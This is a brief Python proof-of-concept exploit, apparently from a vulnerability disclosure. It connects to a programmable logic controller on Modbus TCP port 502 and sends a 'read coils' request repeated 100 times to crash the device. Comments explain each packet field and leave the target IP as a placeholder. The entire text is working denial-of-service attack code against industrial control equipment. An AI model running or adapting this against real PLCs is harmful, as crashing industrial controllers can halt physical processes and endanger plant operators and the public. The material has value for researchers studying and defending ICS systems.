# Python Proof of concept
# A quick run down of the last half start at \x06
# \x06 length
# \x01 unit id
# \x01 function code (read coils)
# \x00\x00 start address
# \x00\x01 coil quantity
# Repeat the request in the packet 100 times
# Unfortunateley I can't remember the minimum number of times you have to
repeat to cause the crash
 
import sys
import socket
 
new = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
new.connect(('X.X.X.X', 502)) #Change the IP address to your PLC IP
Address
new.send('\x00\x01\x00\x00\x00\x06\x01\x01\x00\x00\x00\x01'*100)


